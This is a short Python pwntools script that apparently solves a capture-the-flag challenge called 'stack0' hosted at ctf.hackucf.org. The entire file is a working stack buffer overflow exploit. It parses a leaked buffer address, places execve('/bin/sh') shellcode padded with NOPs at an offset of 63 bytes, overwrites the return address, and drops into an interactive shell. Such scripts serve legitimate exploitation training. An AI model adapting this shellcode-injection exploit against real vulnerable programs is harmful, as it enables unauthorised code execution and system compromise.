# stack0 pt2

from pwn import *
local=False

NOP = "\x90"

if local:
    sh = process('./stack0')
else:
    sh=remote("ctf.hackucf.org", 32101)

# Debug info: Address of input buffer = 0xffffcc4d
buff_addr = sh.recvline().replace("\n", "").split("=")[-1].strip()
ret_2_win_addr = p32(int(buff_addr, 16))
print(buff_addr)

# Enter the name you used to purchase this program: 
sh.recv()
# https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/

shellcode ="\x31\xc0\x50\x68"
shellcode +="\x2f\x2f\x73\x68"
shellcode +="\x68\x2f\x62\x69"
shellcode +="\x6e\x89\xe3\x50"
shellcode +="\x53\x89\xe1\x31"
shellcode +="\xc0\x40\x40\x40"
shellcode +="\x40\x40\x40\x40"
shellcode +="\x40\x40\x40\x40"
shellcode +="\xcd\x80"

offset = 63

payload = shellcode.ljust(offset, NOP) + ret_2_win_addr
#attach(sh)
sh.sendline(payload)

#Thank you for purchasing Hackersoft Powersploit! (...)
print(sh.recv())
# when we get a shell
sh.interactive()
